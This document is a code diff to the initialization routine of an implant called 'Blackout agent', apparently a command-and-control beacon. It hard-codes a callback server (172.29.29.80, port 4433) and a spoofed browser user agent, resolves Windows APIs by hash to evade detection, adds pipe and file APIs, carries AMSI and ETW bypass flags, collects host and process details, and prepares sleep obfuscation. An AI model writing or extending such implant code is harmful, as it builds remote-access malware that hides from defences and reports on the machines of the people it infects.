@@ -2,9 +2,9 @@
 #include <Utils.h>
 #include <Constexpr.h>
 
-#define CONFIG_HOST       L""
-#define CONFIG_PORT       0x00
-#define CONFIG_USERAGENT  L""
+#define CONFIG_HOST       L"172.29.29.80"
+#define CONFIG_PORT       4433
+#define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
 #define CONFIG_KILLDATE   NULL
@@ -48,7 +48,17 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.VirtualProtectEx          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtectEx" ) );
     Instance()->Win32.WaitForSingleObject       = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObject" ) );
     Instance()->Win32.WaitForSingleObjectEx     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "WaitForSingleObjectEx" ) );
-    
+    Instance()->Win32.HeapWalk                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "HeapWalk" ) );
+    Instance()->Win32.CreatePipe                = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreatePipe" ) );
+    Instance()->Win32.CreateNamedPipeA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeA" ) );
+    Instance()->Win32.CreateNamedPipeW          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateNamedPipeW" ) );
+    Instance()->Win32.ConnectNamedPipe          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ConnectNamedPipe" ) );
+    Instance()->Win32.CreateMailslotA           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotA" ) );
+    Instance()->Win32.CreateMailslotW           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateMailslotW" ) );
+    Instance()->Win32.CreateFileA               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileA" ) );
+    Instance()->Win32.CreateFileW               = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateFileW" ) );
+    Instance()->Win32.ReadFile                  = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "ReadFile" ) );
+
     Instance()->Win32.CreateThread              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateThread" ) );
     Instance()->Win32.CreateRemoteThread        = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateRemoteThread" ) );
     Instance()->Win32.QueueUserAPC              = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "QueueUserAPC" ) ); 
@@ -85,6 +95,8 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtTestAlert               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
     Instance()->Win32.NtWaitForSingleObject     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
     Instance()->Win32.NtSignalAndWaitForSingleObject = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
+    Instance()->Win32.NtCreateFile              = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateFile" ) );
+    Instance()->Win32.NtCreateNamedPipeFile     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateNamedPipeFile" ) );   
 
     Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
     Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
@@ -112,48 +124,48 @@ FUNC VOID BlackoutInit() {
 
     Instance()->Win32.printf = LdrFuncAddr( Instance()->Modules.Msvcrt, HASH_STR( "printf" ) );
 
-
     /*============================[ Agent config initialization ]============================*/
 
-    Instance()->Config.Session.WorkingHours = CONFIG_WRKHRS;
-    Instance()->Config.Session.KillDate     = CONFIG_KILLDATE;
-    Instance()->Config.Session.SleepTime    = CONFIG_SLEEP;
-    Instance()->Config.Session.Jitter       = 0x00;
-    //Instance()->Config.Session.AgentId    = RandomNumber32();
-    Instance()->Config.Session.AmsiBypass = FALSE;
-    Instance()->Config.Session.EtwBypass  = FALSE;
-    //nstance()->Config.Session.Heap       = Instance()->Teb->ProcessEnvironmentBlock->ProcessHeap;
-    Instance()->Config.Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
-    Instance()->Config.Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
+    Instance()->Session.WorkingHours = CONFIG_WRKHRS;
+    Instance()->Session.KillDate     = CONFIG_KILLDATE;
+    Instance()->Session.SleepTime    = CONFIG_SLEEP;
+    Instance()->Session.Jitter       = 0x00;
+    Instance()->Session.AgentId    = RandomNumber32();
+    Instance()->Session.AmsiBypass = FALSE;
+    Instance()->Session.EtwBypass  = FALSE;
+    Instance()->Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
+    Instance()->Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
 
     /*============================[ Machine recognition ]============================*/
 
     GetComputerInfo( 
-        &Instance()->Config.CompData.OsArch,
-        &Instance()->Config.CompData.ProcessorType,
-        &Instance()->Config.CompData.ProductType,
-        &Instance()->Config.CompData.IpAddress
+        &Instance()->System.OsArch,
+        &Instance()->System.ProcessorType,
+        &Instance()->System.ProductType,
+        &Instance()->System.IpAddress
     );
 
-    Instance()->Config.CompData.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
-    Instance()->Config.CompData.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
-    Instance()->Config.CompData.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;
+    Instance()->System.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
+    Instance()->System.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
+    Instance()->System.OsBuildNumber   = Instance()->Teb->ProcessEnvironmentBlock->OSBuildNumber;
 
-    Instance()->Config.CompData.OsArch        = 0;
-    Instance()->Config.CompData.ProcessorType = 0;
+    Instance()->System.OsArch        = 0;
+    Instance()->System.ProcessorType = 0;
     
 
     /*============================[ Http/s listener config ]============================*/
 
-    Instance()->Config.TransportWeb.Host      = CONFIG_HOST;
-    Instance()->Config.TransportWeb.Port      = CONFIG_PORT;
-    Instance()->Config.TransportWeb.UserAgent = CONFIG_USERAGENT;
-    Instance()->Config.TransportWeb.Secure    = CONFIG_SECURE;
+    Instance()->Transport.Host      = CONFIG_HOST;
+    Instance()->Transport.Port      = CONFIG_PORT;
+    Instance()->Transport.UserAgent = CONFIG_USERAGENT;
+    Instance()->Transport.Secure    = CONFIG_SECURE;
+
+    /*============================[ Process Informations ]============================*/
 
     GetProcessInfo( 
-        &Instance()->Config.Session.ProcessFullPath, 
-        &Instance()->Config.Session.ProcessName, 
-        &Instance()->Config.Session.ProcessCmdLine 
+        &Instance()->Session.ProcessFullPath, 
+        &Instance()->Session.ProcessName, 
+        &Instance()->Session.ProcessCmdLine 
     );
 
     /*============================[ CFG Routine to SleepObf ]============================*/
@@ -170,45 +182,7 @@ FUNC VOID BlackoutInit() {
         CfgAddressAdd( Instance()->Modules.Ntdll,     Instance()->Win32.RtlExitUserThread );
     }
 
-    Instance()->Win32.printf( 
-        "[INFO] Blackout agent initialized @ 0x%p [%d bytes] FullLen [%d]\n"
-        "[INFO] Blackout Rx Base @ 0x%p [%d bytes]\n"
-        "\t=> Process Heap @ 0x%p\n"
-        "\t=> ProcessId: %d\n"
-        "\t=> ThreadId:  %d\n"
-        "\t=> Sleeptime: %d\n"
-        "\t=> Version: %d.%d.%d\n"
-        "\t=> Hostname:  %s\n"
-        "\t=> NetBios: %s\n"
-        "\t=> Domain Name: %s\n"
-        "\t=> Ip Adress: %s\n"
-        "\t=> User Name: %s\n"
-        "\t=> Process architecture: %d\n"
-        "\t=> Product Type: %d\n"
-        "\t=> Processor type: %d\n"
-        "\t=> Process name: %ws\n"
-        "\t=> Process full path: %ws\n"
-        "\t=> Process CmdLine: %ws\n",
-        Instance()->Base.Buffer,
-        Instance()->Base.Length,
-        Instance()->Base.FullLen,
-        Instance()->Base.RxBase,
-        Instance()->Base.RxSize,
-        Instance()->Config.Session.Heap, 
-        Instance()->Config.Session.ProcessId,
-        Instance()->Config.Session.ThreadId,
-        Instance()->Config.Session.SleepTime,
-        Instance()->Config.CompData.OsMajorV, Instance()->Config.CompData.OsMinorv, Instance()->Config.CompData.OsBuildNumber,
-        Instance()->Config.CompData.ComputerName,
-        Instance()->Config.CompData.NetBios,
-        Instance()->Config.CompData.DomainName,
-        Instance()->Config.CompData.IpAddress,
-        Instance()->Config.CompData.UserName,
-        Instance()->Config.CompData.OsArch,
-        Instance()->Config.CompData.ProductType,
-        Instance()->Config.CompData.ProcessorType,
-        Instance()->Config.Session.ProcessName,
-        Instance()->Config.Session.ProcessFullPath,
-        Instance()->Config.Session.ProcessCmdLine
-    );           
+    /*============================[ Commands Config ]============================*/
+
+
 }
